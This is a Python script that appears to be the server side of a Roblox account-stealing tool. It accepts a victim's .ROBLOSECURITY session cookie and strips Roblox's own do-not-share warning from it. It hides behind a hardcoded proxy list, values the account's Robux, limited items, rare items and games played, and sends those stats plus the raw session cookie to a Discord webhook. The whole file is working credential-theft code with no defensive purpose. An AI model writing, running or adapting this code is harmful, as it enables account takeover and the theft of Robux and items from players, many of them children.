import sys
import os
import re
import time
import random
import requests
from datetime import datetime, timezone

# Your proxy list
RAW_PROXY_LIST = """
socks5://213.165.54.5:1080
socks4://46.8.104.176:1080
http://5.129.254.243:8888
http://5.129.254.49:8888
socks5://93.100.82.163:1080
socks5://80.79.241.118:1080
socks5://185.9.73.44:1080
socks5://46.161.49.174:10808
http://5.129.254.51:8888
http://5.129.254.154:8888
http://5.129.254.60:8888
http://147.45.164.178:8888
socks5://77.91.108.85:1080
http://5.129.254.129:8888
http://5.129.254.5:8888
socks5://217.69.222.174:1080
http://5.129.254.215:8888
socks5://83.234.87.145:1080
socks5://82.142.130.102:1080
http://20.52.234.254:3128
"""

SPECIAL_ASSETS = {
    "korblox": 139607718,
    "headless": 134082579,
    "violet valkyrie": 1402432199,
}

def extract_and_clean_cookie(raw_input):
    if not raw_input:
        return ""
    raw_str = str(raw_input).strip()
    ps_match = re.search(r'System\.Net\.Cookie\(\s*["\']\.ROBLOSECURITY["\']\s*,\s*["\']([^"\']+)["\']', raw_str)
    cookie = ps_match.group(1) if ps_match else raw_str
    if (cookie.startswith('"') and cookie.endswith('"')) or (cookie.startswith("'") and cookie.endswith("'")):
        cookie = cookie[1:-1].strip()
    if cookie.startswith(".ROBLOSECURITY="):
        cookie = cookie[len(".ROBLOSECURITY="):].strip()
    warning_text = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
    if cookie.startswith(warning_text):
        cookie = cookie[len(warning_text):].strip()
    return cookie.lstrip('.').rstrip(';').strip()

def get_working_session(roblosecurity):
    session = requests.Session()
    if roblosecurity:
        session.cookies.set(".ROBLOSECURITY", roblosecurity, domain=".roblox.com")
    
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": "https://www.roblox.com/",
        "Origin": "https://www.roblox.com/"
    })

    manual_proxy = os.environ.get('PROXY_URL')
    proxies_to_try = [manual_proxy] if manual_proxy else []
    parsed_proxies = [line.strip() for line in RAW_PROXY_LIST.strip().splitlines() if line.strip()]
    random.shuffle(parsed_proxies)
    proxies_to_try.extend(parsed_proxies)

    for p in proxies_to_try:
        if not p:
            continue
        proxy_dict = {"http": p, "https": p}
        try:
            session.proxies = proxy_dict
            test_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=5)
            if test_res.status_code != 429:
                return session, test_res
        except Exception:
            continue

    session.proxies = {}
    fallback_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=10)
    return session, fallback_res

def main():
    try:
        webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
        if not webhook_url or len(sys.argv) < 2:
            sys.exit(1)
        
        roblosecurity = extract_and_clean_cookie(sys.argv[1])
        session, auth_res = get_working_session(roblosecurity)
        
        user_id = None
        username = "Unknown User"
        display_name = "Unknown"
        age_days = 0
        robux = 0
        pending = 0
        rap = 0
        lim_count = 0
        group_count = 0
        gamepasses_bought = 0
        premium, developer, email_ver, twofa = False, False, False, False
        credit = 0.0
        currency = "USD"
        adopt_me, mm2, ps99 = False, False, False
        korblox_owned = False
        headless_owned = False
        violet_owned = False

        if auth_res.status_code == 200:
            auth_data = auth_res.json()
            user_id = auth_data.get("id")
            if user_id:
                username = auth_data.get("name", "Unknown")
                display_name = auth_data.get("displayName", username)

                def safe_get(url, **kwargs):
                    try:
                        r = session.get(url, timeout=6, **kwargs)
                        if r.status_code == 200:
                            return r.json()
                    except Exception:
                        pass
                    return {}

                try:
                    # Account Age & Currency
                    user_info = safe_get(f"https://users.roblox.com/v1/users/{user_id}")
                    created = user_info.get("created", "")
                    if created:
                        age_days = (datetime.now(timezone.utc) - datetime.fromisoformat(created.replace("Z", "+00:00"))).days

                    robux_res = safe_get(f"https://economy.roblox.com/v1/user/currency")
                    robux = robux_res.get("robux", 0)

                    pending_res = safe_get(f"https://economy.roblox.com/v2/users/{user_id}/transaction-totals", params={"timeFrame": "Month", "transactionType": "summary"})
                    pending = pending_res.get("pendingRobuxTotal", 0)

                    # Collectibles & RAP
                    collectibles = []
                    cursor = ""
                    while True:
                        res = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles", params={"limit": 100, "sortOrder": "Asc", "cursor": cursor})
                        if not res or "data" not in res:
                            break
                        collectibles += res["data"]
                        cursor = res.get("nextPageCursor")
                        if not cursor:
                            break
                    
                    lim_count = len(collectibles)
                    rap = sum(c.get("recentAveragePrice", 0) for c in collectibles)

                    # Special Assets Ownership Check
                    def owns_asset(asset_id):
                        res = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Asset/{asset_id}")
                        return bool(res.get("data"))

                    korblox_owned = owns_asset(SPECIAL_ASSETS["korblox"])
                    headless_owned = owns_asset(SPECIAL_ASSETS["headless"])
                    violet_owned = owns_asset(SPECIAL_ASSETS["violet valkyrie"])

                    # Games check via badges
                    GAMES = {
                        "adopt me": 383310974,
                        "mm2": 66654135,
                        "ps99": 3317771874,
                    }

                    def check_played_fast(universe_id):
                        r = safe_get(f"https://badges.roblox.com/v1/users/{user_id}/badges", params={"limit": 100})
                        for badge in r.get("data", []):
                            if badge.get("awardingUniverse", {}).get("id") == universe_id:
                                return True
                        return False

                    adopt_me = check_played_fast(GAMES["adopt me"])
                    mm2 = check_played_fast(GAMES["mm2"])
                    ps99 = check_played_fast(GAMES["ps99"])

                except Exception:
                    pass

        avatar_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png" if user_id else "https://www.roblox.com/images/icon_certificate.png"
        
        embed_stats = {
            "title": "📢 Discord Notification 📢",
            "description": f"```ini\n[ ⚡ Stats ] • [ 🌐 Profile ]\n```\n🔗 **[Stats Link](https://www.rolimons.com/player/{user_id})** | **[Roblox Profile](https://www.roblox.com/users/{user_id}/profile)**",
            "color": 0x2B2D31,
            "thumbnail": {"url": avatar_url},
            "fields": [
                {"name": "🐱 Username", "value": f"```ini\n{username}\n```", "inline": False},
                {"name": "📊 Account Stats", "value": f"```diff\n+ Account Age: {age_days} Days\n```", "inline": False},
                {"name": "🪙 Robux", "value": f"```ini\nBalance: {robux:,}\nPending: {pending:,}\n```", "inline": True},
                {"name": "💎 Limiteds", "value": f"```ini\nRAP: {rap:,}\nLimiteds: {lim_count}\n```", "inline": True},
                {"name": "🚀 Summary", "value": f"```ini\n{rap + robux:,}\n```", "inline": True},
                {"name": "👑 Special Items", "value": f"```diff\n+ Korblox: {korblox_owned}\n+ Headless: {headless_owned}\n+ Violet Valk: {violet_owned}\n```", "inline": False},
                {"name": "⭐ Games", "value": f"```diff\n+ MM2: {mm2}\n+ PS99: {ps99}\n+ Adopt Me: {adopt_me}\n```", "inline": True}
            ],
            "footer": {"text": f"VERSION_01 | 13+ • {display_name}"},
            "timestamp": datetime.now(timezone.utc).isoformat()
        }

        embed_cookie = {
            "title": "🍪 Session Cookie Data",
            "description": f"```text\n{roblosecurity}\n```",
            "color": 0x2B2D31,
            "footer": {"text": f"Token Length: {len(roblosecurity)} chars"}
        }

        payload = {
            "username": f"{display_name} | Stats",
            "avatar_url": avatar_url,
            "embeds": [embed_stats, embed_cookie]
        }

        requests.post(webhook_url, json=payload, timeout=10)

    except Exception as e:
        print(f"DEBUG CRITICAL EXCEPTION: {e}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    main()
